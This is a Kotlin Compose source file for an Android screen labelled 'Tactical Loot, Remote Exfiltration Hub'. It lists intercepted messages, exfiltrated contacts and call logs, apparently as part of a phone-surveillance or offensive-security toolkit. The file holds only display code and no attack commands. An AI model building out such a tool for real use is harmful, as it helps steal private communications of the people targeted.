package com.example.rabit.ui.loot

import androidx.compose.animation.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.Chat
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.rabit.ui.theme.*
import java.text.SimpleDateFormat
import java.util.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun LootViewerScreen(
    viewModel: LootViewModel,
    onBack: () -> Unit
) {
    var selectedTab by remember { mutableStateOf(0) }
    val messages by viewModel.messages.collectAsState()
    val contacts by viewModel.contacts.collectAsState()
    val calls by viewModel.calls.collectAsState()

    Scaffold(
        containerColor = Obsidian,
        topBar = {
            CenterAlignedTopAppBar(
                title = {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text("TACTICAL LOOT", style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Black, color = Platinum))
                        Text("REMOTE EXFILTRATION HUB", color = AccentBlue, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, null, tint = Platinum)
                    }
                },
                actions = {
                    IconButton(onClick = { viewModel.generateDemoLoot() }) {
                        Icon(Icons.Default.Refresh, null, tint = AccentBlue)
                    }
                    IconButton(onClick = { viewModel.clearLoot() }) {
                        Icon(Icons.Default.DeleteForever, null, tint = Color.Red)
                    }
                },
                colors = TopAppBarDefaults.centerAlignedTopAppBarColors(containerColor = Color.Transparent)
            )
        }
    ) { padding ->
        Column(modifier = Modifier.fillMaxSize().padding(padding)) {
            // --- Tab Selector ---
            TabRow(
                selectedTabIndex = selectedTab,
                containerColor = Color.Transparent,
                contentColor = AccentBlue,
                indicator = { tabPositions ->
                    TabRowDefaults.SecondaryIndicator(
                        Modifier.tabIndicatorOffset(tabPositions[selectedTab]),
                        color = AccentBlue
                    )
                },
                divider = { HorizontalDivider(color = BorderColor.copy(alpha = 0.1f)) }
            ) {
                Tab(selected = selectedTab == 0, onClick = { selectedTab = 0 }) {
                    Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.AutoMirrored.Filled.Chat, null, tint = if (selectedTab == 0) AccentBlue else Silver)
                        Text("MESSAGES", fontSize = 10.sp, fontWeight = FontWeight.Black, color = if (selectedTab == 0) Platinum else Silver)
                    }
                }
                Tab(selected = selectedTab == 1, onClick = { selectedTab = 1 }) {
                    Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.Contacts, null, tint = if (selectedTab == 1) AccentBlue else Silver)
                        Text("CONTACTS", fontSize = 10.sp, fontWeight = FontWeight.Black, color = if (selectedTab == 1) Platinum else Silver)
                    }
                }
                Tab(selected = selectedTab == 2, onClick = { selectedTab = 2 }) {
                    Column(modifier = Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.Call, null, tint = if (selectedTab == 2) AccentBlue else Silver)
                        Text("CALL LOGS", fontSize = 10.sp, fontWeight = FontWeight.Black, color = if (selectedTab == 2) Platinum else Silver)
                    }
                }
            }

            // --- Content ---
            Box(modifier = Modifier.weight(1f).fillMaxWidth()) {
                when (selectedTab) {
                    0 -> MessageList(messages)
                    1 -> ContactList(contacts)
                    2 -> CallLogList(calls)
                }
            }
        }
    }
}

@Composable
fun MessageList(messages: List<com.example.rabit.data.loot.LootMessage>) {
    if (messages.isEmpty()) EmptyState("No intercepted messages")
    else {
        LazyColumn(contentPadding = PaddingValues(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            items(messages) { msg ->
                LootCard {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(modifier = Modifier.size(32.dp).background(AccentBlue.copy(alpha = 0.1f), RoundedCornerShape(8.dp)), contentAlignment = Alignment.Center) {
                            Icon(Icons.AutoMirrored.Filled.Chat, null, tint = AccentBlue, modifier = Modifier.size(16.dp))
                        }
                        Spacer(Modifier.width(12.dp))
                        Column {
                            Text(msg.sender, color = Platinum, fontWeight = FontWeight.Black, fontSize = 14.sp)
                            Text(formatTime(msg.timestamp), color = Silver, fontSize = 10.sp)
                        }
                    }
                    Spacer(Modifier.height(12.dp))
                    Text(msg.body, color = Silver, fontSize = 13.sp, lineHeight = 18.sp)
                }
            }
        }
    }
}

@Composable
fun ContactList(contacts: List<com.example.rabit.data.loot.LootContact>) {
    if (contacts.isEmpty()) EmptyState("No exfiltrated contacts")
    else {
        LazyColumn(contentPadding = PaddingValues(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            items(contacts) { contact ->
                LootCard {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(modifier = Modifier.size(40.dp).background(SuccessGreen.copy(alpha = 0.1f), RoundedCornerShape(100.dp)), contentAlignment = Alignment.Center) {
                            Text(contact.name.take(1), color = SuccessGreen, fontWeight = FontWeight.Black)
                        }
                        Spacer(Modifier.width(12.dp))
                        Column {
                            Text(contact.name, color = Platinum, fontWeight = FontWeight.Black, fontSize = 14.sp)
                            Text(contact.number, color = AccentBlue, fontSize = 12.sp, fontFamily = FontFamily.Monospace)
                        }
                        Spacer(Modifier.weight(1f))
                        IconButton(onClick = { /* Call Action */ }) {
                            Icon(Icons.Default.Phone, null, tint = Silver, modifier = Modifier.size(18.dp))
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun CallLogList(calls: List<com.example.rabit.data.loot.LootCall>) {
    if (calls.isEmpty()) EmptyState("No call history detected")
    else {
        LazyColumn(contentPadding = PaddingValues(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            items(calls) { call ->
                LootCard {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            imageVector = when(call.type) {
                                "Incoming" -> Icons.Default.CallReceived
                                "Missed" -> Icons.Default.CallMissed
                                else -> Icons.Default.CallMade
                            },
                            contentDescription = null,
                            tint = when(call.type) {
                                "Missed" -> Color.Red
                                "Incoming" -> SuccessGreen
                                else -> AccentBlue
                            },
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(Modifier.width(16.dp))
                        Column {
                            Text(call.number, color = Platinum, fontWeight = FontWeight.Black, fontSize = 14.sp)
                            Text("${call.type} • ${call.duration} • ${formatTime(call.timestamp)}", color = Silver, fontSize = 10.sp)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun LootCard(content: @Composable ColumnScope.() -> Unit) {
    Surface(
        color = Surface0.copy(alpha = 0.5f),
        shape = RoundedCornerShape(16.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, BorderColor.copy(alpha = 0.1f)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            content()
        }
    }
}

@Composable
fun EmptyState(text: String) {
    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.Radar, null, tint = Silver.copy(alpha = 0.2f), modifier = Modifier.size(64.dp))
            Spacer(Modifier.height(16.dp))
            Text(text, color = Silver.copy(alpha = 0.5f), fontWeight = FontWeight.Bold, fontSize = 12.sp)
        }
    }
}

fun formatTime(timestamp: Long): String {
    return SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault()).format(Date(timestamp))
}
